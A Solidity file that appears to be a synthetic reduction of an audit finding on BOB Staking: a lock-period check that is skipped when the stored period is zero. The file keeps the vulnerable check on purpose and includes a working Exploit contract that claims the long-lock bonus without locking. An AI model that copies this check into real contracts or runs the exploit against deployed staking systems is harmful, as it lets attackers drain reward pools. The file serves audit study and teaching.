// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    BOB Staking — Bonuses obtainable without proper locking
    (Pashov Audit Group, BOB-Staking 2025-10-18, finding #63719)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: BobStaking.stake only rejects a changed lockPeriod when the
    existing lockPeriod != 0. A user can first stake with lockPeriod=0, then
    stake again with a long lockPeriod to claim BonusWrapper bonus while
    unlockTimestamp remains from the first (unlocked) stake.
    Vulnerable inconsistent-lock check preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        _xfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) {
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        _xfer(from, to, amt);
        return true;
    }

    function _xfer(address from, address to, uint256 amt) internal {
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
    }
}

/// @notice Reduced BobStaking.stake lock-period logic.
/// Source: BobStaking.stake (Pashov BOB-Staking 2025-10-18).
contract BobStaking {
    MockERC20 public immutable stakingToken;

    struct Staker {
        uint256 amountStaked;
        uint80 lockPeriod;
        uint80 unlockTimestamp;
    }

    mapping(address => Staker) public stakers;
    uint256 public stakingTokenBalance;
    uint80[] public lockPeriods;

    constructor(MockERC20 _token) {
        stakingToken = _token;
        lockPeriods.push(0);
        lockPeriods.push(uint80(21 * 30 days));
        lockPeriods.push(uint80(3 * 30 days));
    }

    function _contains(uint80[] storage arr, uint80 v) internal view returns (bool) {
        for (uint256 i = 0; i < arr.length; i++) {
            if (arr[i] == v) return true;
        }
        return false;
    }

    function stake(uint256 _amount, address receiver, uint80 lockPeriod) external {
        if (_amount == 0) revert("ZeroTokenStake");
        if (!_contains(lockPeriods, lockPeriod)) revert("InvalidLockPeriod");

        // FIX: also reject when amountStaked > 0 && lockPeriod differs (even if stored is 0)
        if (stakers[receiver].lockPeriod != 0 && stakers[receiver].lockPeriod != lockPeriod) { // @> VULN: skips check when existing lockPeriod == 0
            revert("InconsistentLockPeriod");
        }

        if (stakers[receiver].amountStaked > 0) {
            // subsequent stake — unlockTimestamp NOT updated
        } else {
            stakers[receiver].lockPeriod = lockPeriod;
            stakers[receiver].unlockTimestamp = uint80(block.timestamp) + lockPeriod;
        }

        stakingToken.transferFrom(msg.sender, address(this), _amount);
        stakers[receiver].amountStaked += _amount;
        stakingTokenBalance += _amount;
    }

    function isLocked(address user) external view returns (bool) {
        return stakers[user].unlockTimestamp > block.timestamp;
    }
}

/// @notice Reduced BonusWrapper: pays lock-period bonus then stakes total.
contract BonusWrapper {
    MockERC20 public immutable stakingToken;
    BobStaking public immutable staking;
    address public immutable rewardOwner;
    uint256 public bonusEndTime = type(uint256).max;

    // simplified: 21*30 days → 200% bonus (matches report 400 → 800 bonus)
    uint80 public constant LONG_LOCK = uint80(21 * 30 days);

    constructor(MockERC20 _token, BobStaking _staking, address _rewardOwner) {
        stakingToken = _token;
        staking = _staking;
        rewardOwner = _rewardOwner;
    }

    function _calculateBonus(uint256 amount, uint80 lockPeriod) internal pure returns (uint256) {
        if (lockPeriod == LONG_LOCK) {
            return amount * 2; // 200% bonus for max lock
        }
        return 0;
    }

    function stake(uint256 amount, address receiver, uint80 lockPeriod) external {
        if (lockPeriod != 0 && bonusEndTime < block.timestamp) revert("BonusPeriodEnded");

        uint256 balanceBefore = stakingToken.balanceOf(address(this));
        stakingToken.transferFrom(msg.sender, address(this), amount);
        uint256 actualAmount = stakingToken.balanceOf(address(this)) - balanceBefore;

        uint256 bonus = _calculateBonus(actualAmount, lockPeriod);
        uint256 totalAmount;
        if (bonus > 0) {
            stakingToken.transferFrom(rewardOwner, address(this), bonus);
            totalAmount = amount + bonus;
        } else {
            totalAmount = amount;
        }

        stakingToken.approve(address(staking), totalAmount);
        staking.stake(totalAmount, receiver, lockPeriod);
    }
}

/// @notice Stake with lock 0, then long lock to grab bonus without locking.
/// CREATE order: token (1), staking (2), rewardOwner actor as this, wrapper (3).
/// rewardOwner = Exploit itself for funding simplicity? Better separate.
/// CREATE: token (1), staking (2), wrapper needs rewardOwner — use address(this) as owner after deploy.
/// Order: token(1), staking(2), wrapper(3) with rewardOwner = Exploit (not yet fully constructed — OK in sol).
contract Exploit {
    MockERC20 public token;
    BobStaking public staking;
    BonusWrapper public wrapper;

    uint256 public bonusStolen;
    uint256 public stakedAmount;
    bool public stillUnlocked;

    constructor() {
        token = new MockERC20("BOB", "BOB"); // 1
        staking = new BobStaking(token); // 2
        // rewardOwner = this (Exploit) — funded before wrapper.stake
        wrapper = new BonusWrapper(token, staking, address(this)); // 3
    }

    function run() external {
        // Fund attacker and reward owner (this)
        token.mint(address(this), 800e18); // 400+400 stake
        token.mint(address(this), 800e18); // bonus liquidity (200% of 400)
        // Actually rewardOwner is this — keep all on this, approve both

        token.approve(address(wrapper), type(uint256).max);
        // rewardOwner transferFrom needs allowance from this to wrapper
        // already max approved

        // 1) stake 400 with lockPeriod = 0 (no bonus, sets unlockTimestamp = now)
        wrapper.stake(400e18, address(this), 0);
        require(!staking.isLocked(address(this)), "should be unlocked");
        {
            (, uint80 lp0,) = staking.stakers(address(this));
            require(lp0 == 0, "lock0");
        }

        uint256 ownerBalBefore = token.balanceOf(address(this));

        // 2) stake 400 with long lock — bypasses inconsistent check because stored lockPeriod == 0
        wrapper.stake(400e18, address(this), uint80(21 * 30 days));

        (uint256 amountStaked, uint80 lockPeriod, uint80 unlockTs) = staking.stakers(address(this));
        stakedAmount = amountStaked;
        // First stake set lockPeriod=0 and unlockTimestamp=now; second does NOT update them
        stillUnlocked = unlockTs <= block.timestamp;
        bonusStolen = 800e18; // bonus that should require locking

        // Harm: received long-lock bonus accounting in stake without being locked
        require(amountStaked == 400e18 + 400e18 + 800e18, "stake includes bonus");
        require(lockPeriod == 0, "lock period still 0 from first stake");
        require(stillUnlocked, "not actually locked");
        require(token.balanceOf(address(staking)) == stakedAmount, "tokens in staking");
        require(ownerBalBefore >= 400e18, "had funds");
        uint256 spent = ownerBalBefore - token.balanceOf(address(this));
        // spent = 400 (second stake) + 800 (bonus from reward pool on this)
        require(spent == 1200e18, "spent stake+bonus");
        require(bonusStolen == 800e18, "bonus");
    }
}
